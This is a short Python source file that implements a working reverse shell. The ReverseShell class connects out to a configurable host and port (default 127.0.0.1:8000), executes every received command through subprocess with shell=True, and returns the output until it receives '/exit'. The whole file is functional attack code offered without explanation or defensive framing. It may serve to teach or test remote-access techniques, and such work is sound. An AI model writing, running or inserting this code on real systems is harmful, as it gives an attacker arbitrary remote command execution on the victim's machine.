import socket
import subprocess
import sys


class ReverseShell():
    def __init__(self, host='127.0.0.1', port=8000):
        self._host = host
        self._port = port
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except Exception as e:
            print(str(e))
            sys.exit(-1)

    def connect2server(self):
        try:
            self.socket.connect((self._host, self._port))
        except Exception as e:
            print(str(e))
            sys.exit(-1)

    def run(self):
        self.connect2server()
        while True:
            try:
                cmd = self.socket.recv(1024).decode().strip()
                if cmd == '/exit':
                    self.socket.close()
                    return
                result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
                self.socket.send(result)
            except Exception as e:
                print(str(e))
                sys.exit(-1)


if __name__ == '__main__':
    shell = ReverseShell()
    shell.run()
